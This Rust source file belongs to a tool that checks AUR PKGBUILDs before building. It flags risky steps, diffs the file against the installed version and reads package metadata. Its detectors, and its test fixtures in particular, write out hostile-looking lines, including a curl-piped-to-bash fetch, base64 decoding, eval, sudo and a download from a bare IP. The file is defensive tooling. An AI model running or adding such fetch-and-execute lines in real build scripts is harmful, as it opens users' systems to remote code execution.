//! A look at an AUR package before it is built: its PKGBUILD, what changed
//! since the installed version, and plain hints about things worth a second
//! look. The hints are heuristics, not a security guarantee; the review dialog
//! says so.
use std::collections::BTreeSet;
use std::path::PathBuf;
use std::time::Duration;

use anyhow::{anyhow, Result};
use serde::Deserialize;

const RPC: &str = "https://aur.archlinux.org/rpc/v5/info?arg[]=";
const PKGBUILD: &str = "https://aur.archlinux.org/cgit/aur.git/plain/PKGBUILD?h=";
const DAY: u64 = 24 * 60 * 60;

#[derive(Debug, Clone, Default, Deserialize, PartialEq)]
pub struct AurMeta {
    #[serde(rename = "PackageBase", default)]
    pub package_base: String,
    #[serde(rename = "NumVotes", default)]
    pub votes: u64,
    #[serde(rename = "Popularity", default)]
    pub popularity: f64,
    #[serde(rename = "Maintainer", default)]
    pub maintainer: Option<String>,
    #[serde(rename = "FirstSubmitted", default)]
    pub first_submitted: u64,
    #[serde(rename = "LastModified", default)]
    pub last_modified: u64,
    #[serde(rename = "OutOfDate", default)]
    pub out_of_date: Option<u64>,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Level {
    Warning,
    Note,
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Hint {
    pub level: Level,
    /// English text, translated by the UI.
    pub text: &'static str,
    /// The concrete line, domain or number behind the hint.
    pub detail: String,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Change {
    Same,
    Added,
    Removed,
}

pub struct Review {
    pub meta: AurMeta,
    pub pkgbuild: String,
    /// PKGBUILD of the installed version, from the AUR helper's cache.
    pub previous: Option<String>,
    pub hints: Vec<Hint>,
}

/// Downloads metadata and PKGBUILD; call off the main thread.
pub fn review(name: &str) -> Result<Review> {
    let agent = ureq::AgentBuilder::new().timeout(Duration::from_secs(10)).build();
    #[derive(Deserialize)]
    struct Response {
        results: Vec<AurMeta>,
    }
    let text = agent.get(&format!("{RPC}{name}")).call()?.into_string()?;
    let response: Response = serde_json::from_str(&text)?;
    let meta = response.results.into_iter().next().ok_or_else(|| anyhow!("{name} is not in the AUR"))?;
    let base = if meta.package_base.is_empty() { name.to_string() } else { meta.package_base.clone() };
    let pkgbuild = agent.get(&format!("{PKGBUILD}{base}")).call()?.into_string()?;
    let previous = cached_pkgbuild(&base);
    let now = std::time::SystemTime::now().duration_since(std::time::UNIX_EPOCH).map(|d| d.as_secs()).unwrap_or(0);
    let hints = analyze(&pkgbuild, previous.as_deref(), &meta, now);
    Ok(Review { meta, pkgbuild, previous, hints })
}

/// The PKGBUILD paru or yay kept from the last build of this package.
fn cached_pkgbuild(base: &str) -> Option<String> {
    let cache = std::env::var_os("XDG_CACHE_HOME")
        .map(PathBuf::from)
        .or_else(|| std::env::var_os("HOME").map(|home| PathBuf::from(home).join(".cache")))?;
    [cache.join("paru/clone").join(base), cache.join("yay").join(base)]
        .iter()
        .find_map(|dir| std::fs::read_to_string(dir.join("PKGBUILD")).ok())
}

pub fn analyze(pkgbuild: &str, previous: Option<&str>, meta: &AurMeta, now: u64) -> Vec<Hint> {
    let mut hints = Vec::new();
    let mut warn = |text: &'static str, detail: String| hints.push(Hint { level: Level::Warning, text, detail });
    for line in command_lines(pkgbuild) {
        let lower = line.to_lowercase();
        let fetches = lower.contains("curl ") || lower.contains("wget ");
        if fetches && lower.contains('|') && (lower.contains(" sh") || lower.contains("bash")) {
            warn("Downloads a script and runs it right away", line.to_string());
        }
        if lower.contains("base64 -d") || lower.contains("base64 --decode") {
            warn("Decodes hidden (Base64) content", line.to_string());
        }
        if lower.split(|c: char| !c.is_alphanumeric()).any(|word| word == "eval") {
            warn("Runs commands that are assembled while building (eval)", line.to_string());
        }
        if lower.split(|c: char| !c.is_alphanumeric() && c != '_').any(|word| word == "sudo") {
            warn("Asks for administrator rights while building", line.to_string());
        }
    }
    for url in urls(pkgbuild) {
        if url.starts_with("http://") {
            warn("Downloads over unencrypted HTTP", url.clone());
        }
        if host(&url).is_some_and(|host| host.parse::<std::net::IpAddr>().is_ok()) {
            warn("Downloads from a bare IP address", url);
        }
    }
    if let Some(previous) = previous {
        let before: BTreeSet<String> = urls(previous).iter().filter_map(|u| host(u)).collect();
        let new: Vec<String> = urls(pkgbuild).iter().filter_map(|u| host(u)).filter(|h| !before.contains(h)).collect::<BTreeSet<_>>().into_iter().collect();
        if !new.is_empty() {
            warn("New download sources since your version", new.join(", "));
        }
        if maintainer_lines(previous) != maintainer_lines(pkgbuild) {
            hints.push(Hint { level: Level::Note, text: "The maintainer line changed since your version", detail: maintainer_lines(pkgbuild).join("; ") });
        }
    }
    if meta.maintainer.is_none() {
        hints.push(Hint { level: Level::Warning, text: "Nobody maintains this package (orphaned)", detail: String::new() });
    }
    if meta.first_submitted > 0 && now.saturating_sub(meta.first_submitted) < 30 * DAY {
        hints.push(Hint { level: Level::Warning, text: "New package, first published less than 30 days ago", detail: String::new() });
    }
    if meta.votes < 5 {
        hints.push(Hint { level: Level::Note, text: "Few people use this package so far", detail: String::new() });
    }
    if meta.out_of_date.is_some() {
        hints.push(Hint { level: Level::Note, text: "Marked as out of date", detail: String::new() });
    }
    hints
}

/// PKGBUILD lines without comments and blank lines.
fn code_lines(text: &str) -> impl Iterator<Item = &str> {
    text.lines().map(str::trim).filter(|line| !line.is_empty() && !line.starts_with('#'))
}

/// Lines that run commands: everything except variable assignments such as
/// `depends=(... 'sudo: privilege elevation')`, including multi-line arrays.
fn command_lines(text: &str) -> Vec<&str> {
    let mut in_array = false;
    let mut lines = Vec::new();
    for line in code_lines(text) {
        if in_array {
            in_array = !line.contains(')');
            continue;
        }
        let assignment = line.split_once('=').is_some_and(|(name, _)| {
            !name.is_empty() && name.chars().all(|c| c.is_ascii_alphanumeric() || c == '_')
        });
        if assignment {
            in_array = line.contains("=(") && !line.contains(')');
            continue;
        }
        lines.push(line);
    }
    lines
}

/// Download URLs; the homepage (`url=`) is not downloaded and is skipped.
fn urls(text: &str) -> Vec<String> {
    code_lines(text)
        .filter(|line| !line.starts_with("url="))
        .flat_map(|line| {
            line.match_indices("://").filter_map(move |(at, _)| {
                let start = line[..at].rfind(|c: char| !c.is_ascii_alphabetic()).map(|i| i + 1).unwrap_or(0);
                let scheme = &line[start..at];
                if scheme != "http" && scheme != "https" {
                    return None;
                }
                let end = line[at..].find(|c: char| c.is_whitespace() || matches!(c, '"' | '\'' | ')')).map(|i| at + i).unwrap_or(line.len());
                Some(line[start..end].to_string())
            })
        })
        .collect()
}

fn host(url: &str) -> Option<String> {
    let rest = url.split_once("://")?.1;
    let host = rest.split(['/', ':', '?']).next()?.to_lowercase();
    (!host.is_empty() && !host.contains('$')).then_some(host)
}

fn maintainer_lines(text: &str) -> Vec<String> {
    text.lines().map(str::trim).filter(|line| line.starts_with("# Maintainer")).map(str::to_string).collect()
}

/// Line diff by longest common subsequence; PKGBUILDs are short.
pub fn diff(old: &str, new: &str) -> Vec<(Change, String)> {
    let (a, b): (Vec<&str>, Vec<&str>) = (old.lines().collect(), new.lines().collect());
    let mut lcs = vec![vec![0u32; b.len() + 1]; a.len() + 1];
    for i in (0..a.len()).rev() {
        for j in (0..b.len()).rev() {
            lcs[i][j] = if a[i] == b[j] { lcs[i + 1][j + 1] + 1 } else { lcs[i + 1][j].max(lcs[i][j + 1]) };
        }
    }
    let (mut i, mut j, mut out) = (0, 0, Vec::new());
    while i < a.len() || j < b.len() {
        if i < a.len() && j < b.len() && a[i] == b[j] {
            out.push((Change::Same, a[i].to_string()));
            i += 1;
            j += 1;
        } else if j < b.len() && (i == a.len() || lcs[i][j + 1] >= lcs[i + 1][j]) {
            out.push((Change::Added, b[j].to_string()));
            j += 1;
        } else {
            out.push((Change::Removed, a[i].to_string()));
            i += 1;
        }
    }
    out
}

#[cfg(test)]
mod tests {
    use super::*;

    fn meta() -> AurMeta {
        AurMeta { votes: 120, maintainer: Some("someone".into()), first_submitted: 1, ..Default::default() }
    }

    const CLEAN: &str = "# Maintainer: Someone <a@b>\npkgname=demo\nurl=\"http://example.org\"\nsource=(\"https://github.com/demo/demo/archive/v1.tar.gz\")\npackage() {\n  install -Dm755 demo \"$pkgdir/usr/bin/demo\"\n}\n";

    #[test]
    fn a_plain_package_raises_nothing() {
        assert!(analyze(CLEAN, Some(CLEAN), &meta(), 10 * 365 * DAY).is_empty());
    }

    #[test]
    fn risky_build_steps_are_named() {
        let pkgbuild = "source=(\"http://10.0.0.5/tool.tar.gz\")\noptdepends=('sudo: privilege elevation'\n  'eval: not a command')\nbuild() {\n  curl -fsSL https://get.example.sh | bash\n  echo aGk= | base64 -d > x\n  eval \"$cmd\"\n  sudo make install\n}\n# curl https://x | sh in a comment is ignored\n";
        let texts: Vec<_> = analyze(pkgbuild, None, &meta(), 10 * 365 * DAY).into_iter().map(|h| h.text).collect();
        for expected in ["Downloads a script and runs it right away", "Decodes hidden (Base64) content",
            "Runs commands that are assembled while building (eval)", "Asks for administrator rights while building",
            "Downloads over unencrypted HTTP", "Downloads from a bare IP address"] {
            assert!(texts.contains(&expected), "missing {expected}");
        }
        assert_eq!(texts.iter().filter(|t| **t == "Downloads a script and runs it right away").count(), 1);
    }

    #[test]
    fn changes_since_the_installed_version_are_compared() {
        let newer = CLEAN.replace("github.com", "files.example.net").replace("Someone", "Other");
        let hints = analyze(&newer, Some(CLEAN), &meta(), 10 * 365 * DAY);
        assert!(hints.iter().any(|h| h.text == "New download sources since your version" && h.detail == "files.example.net"));
        assert!(hints.iter().any(|h| h.text == "The maintainer line changed since your version"));
    }

    #[test]
    fn metadata_hints() {
        let fresh = AurMeta { votes: 1, maintainer: None, first_submitted: 100 * DAY - 2 * DAY, out_of_date: Some(5), ..Default::default() };
        let texts: Vec<_> = analyze(CLEAN, None, &fresh, 100 * DAY).into_iter().map(|h| h.text).collect();
        assert_eq!(texts, ["Nobody maintains this package (orphaned)", "New package, first published less than 30 days ago",
            "Few people use this package so far", "Marked as out of date"]);
    }

    #[test]
    fn variables_in_urls_are_not_domains() {
        assert_eq!(host("https://$pkgname.example/x"), None);
        assert_eq!(host("https://GitHub.com:443/a"), Some("github.com".into()));
    }

    #[test]
    fn line_diff_marks_added_and_removed() {
        let changes = diff("a\nb\nc\n", "a\nx\nc\n");
        assert_eq!(changes, vec![(Change::Same, "a".into()), (Change::Added, "x".into()), (Change::Removed, "b".into()), (Change::Same, "c".into())]);
    }
}

#[cfg(test)]
mod live {
    /// Manual check against the real AUR: cargo test live_aur -- --ignored --nocapture
    #[test]
    #[ignore]
    fn live_aur() {
        for name in ["google-chrome", "hamr", "visual-studio-code-bin", "yay"] {
            match super::review(name) {
                Ok(r) => {
                    let changed = r.previous.as_deref().map(|p| super::diff(p, &r.pkgbuild).iter().filter(|(c, _)| *c != super::Change::Same).count());
                    println!("{name}: votes {} maintainer {:?} previous {} changed_lines {:?}", r.meta.votes, r.meta.maintainer, r.previous.is_some(), changed);
                    for h in r.hints { println!("   {:?} {} [{}]", h.level, h.text, h.detail); }
                }
                Err(e) => println!("{name}: {e}"),
            }
        }
    }
}
